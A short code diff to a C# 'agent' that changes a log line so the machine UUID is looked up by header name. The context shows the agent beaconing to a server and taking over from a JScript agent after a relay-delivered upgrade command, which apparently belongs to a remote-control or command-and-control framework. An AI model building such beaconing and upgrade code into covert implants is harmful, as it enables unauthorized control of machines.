@@ -35,7 +35,10 @@ namespace CSharpAgent
             var headers = Identity.Build();
             _beaconUrl = beaconUrl;
             _headers = headers;
-            Log("beaconing to " + beaconUrl + " as " + headers[1][1]);
+            var uuid = "";
+            for (var i = 0; i < headers.Length; i++)
+                if (headers[i][0] == "X-Agent-Machine-Uuid") uuid = headers[i][1];
+            Log("beaconing to " + beaconUrl + " as " + (uuid != "" ? uuid : "an unidentified machine"));
 
             // OWED REPLY — the upgrade handover. We were deserialized by a 0x0B Upgrade command
             // that the relay already delivered to the JScript agent on this machine; the
